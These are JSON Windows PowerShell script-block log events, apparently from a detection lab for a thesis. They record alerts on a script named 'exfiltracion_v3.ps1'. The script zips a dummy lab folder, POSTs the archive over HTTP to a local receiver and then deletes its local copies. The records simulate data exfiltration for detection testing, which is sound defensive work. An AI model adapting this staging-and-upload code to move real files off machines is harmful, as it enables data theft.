{"Timestamp":"2026-07-12T13:29:20.622279882Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"medium","Title":"Usage Of Web Request Commands And Cmdlets - ScriptBlock","RecordID":3287653,"Details":"ScriptBlock: # TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862960.62228},"EventRecordID":3287653,"Correlation":{"ActivityID":"F2694954-11F0-0003-AA22-6FF2F011DD01"},"Execution":{"ProcessID":4956,"ThreadID":12076},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","ScriptBlockId":"622fc977-93d2-4ba5-b172-df52bf57b8a9","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n\n\nId. de bloque de script: 622fc977-93d2-4ba5-b172-df52bf57b8a9\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:20.622279882Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"low","Title":"Compress-Archive Cmdlet Execution","RecordID":3287653,"Details":"ScriptBlock: # TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862960.62228},"EventRecordID":3287653,"Correlation":{"ActivityID":"F2694954-11F0-0003-AA22-6FF2F011DD01"},"Execution":{"ProcessID":4956,"ThreadID":12076},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","ScriptBlockId":"622fc977-93d2-4ba5-b172-df52bf57b8a9","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = 